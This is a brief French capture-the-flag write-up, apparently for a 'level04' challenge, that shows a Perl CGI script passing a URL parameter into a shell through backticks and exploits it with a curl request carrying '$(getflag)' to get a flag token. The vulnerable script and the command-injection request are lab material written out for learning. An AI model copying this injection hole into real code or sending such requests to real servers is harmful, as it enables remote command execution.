bon ls -la

je trouve level04.pl
je le cat 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

je comprend qu'il lui faut un param x donc je test:
./level04.pl x=$(getflag)

il me ressort check

j'ai regarder ce aue c'etait CGI et je trouve ca Common Gateway Interface
ensuite avec localhost je me dit que ca s'execute via web request

sachant qu'il faut une request sur le web je regarde ce que je peux trouver

je suis tomber sur curl qui par definition
curl is a tool to transfer data from or to a server, using one of the supported protocols
fait exactement ce qu'on a besoin

je try curl '[ip]:4747?x=$(getflag)'
et hop
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap